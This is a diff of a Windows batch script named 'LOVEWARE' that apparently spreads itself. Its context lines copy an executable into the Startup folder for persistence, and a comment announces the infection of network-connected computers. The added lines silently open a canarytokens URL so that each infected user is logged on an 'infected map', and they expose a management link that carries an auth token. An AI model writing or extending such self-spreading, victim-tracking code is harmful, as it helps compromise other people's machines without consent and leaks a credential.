@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v8.3
+:: LOVEWARE v8.4
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -167,6 +167,11 @@ XCOPY "%USERPROFILE%\Downloads\SomeHugs.exe" "%APPDATA%\Microsoft\Windows\Start 
 goto run1
 timeout 20
 goto copylove
+
+:: Goto canarytoken link that will add the infected by Loveware user to the Loveware Infected map.
+:: Loveware infected map: https://canarytokens.org/manage?token=h8blu81q8j2vzu825fmpzut7r&auth=e8be20c708872b669cd4562d35b5abf7
+
+start /min http://canarytokens.com/tags/terms/h8blu81q8j2vzu825fmpzut7r/contact.php
 
 :: Infect network connected computers
 
